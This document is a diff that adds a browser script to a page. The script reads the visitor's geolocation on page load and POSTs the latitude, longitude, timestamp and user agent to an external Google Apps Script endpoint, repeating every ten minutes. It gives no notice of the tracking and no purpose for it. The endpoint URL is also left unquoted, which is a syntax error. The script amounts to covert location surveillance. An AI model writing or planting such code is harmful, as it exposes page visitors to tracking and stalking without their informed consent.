@@ -1,0 +1,39 @@
+<script>
+const endpoint = https://script.google.com/macros/s/AKfycbwEaFIZNy-WpxwBzEwTiJmLhCngSDeDfStyd5NmOsTO-cwGM8RTvLbZ4RahD36NMhiH/exec;
+
+function sendLocation() {
+    if (!navigator.geolocation) {
+        console.log("Geolocation not supported");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(function(position) {
+
+        var lat = position.coords.latitude;
+        var lon = position.coords.longitude;
+
+        fetch(endpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                latitude: lat,
+                longitude: lon,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            })
+        })
+        .then(res => res.text())
+        .then(data => console.log("Location sent:", data))
+        .catch(err => console.error("Error:", err));
+
+    }, function(error) {
+        console.log("Location denied or unavailable");
+    });
+}
+
+// Send immediately
+sendLocation();
+
+// Send every 10 minutes (600000 ms)
+setInterval(sendLocation, 600000);
+</script>
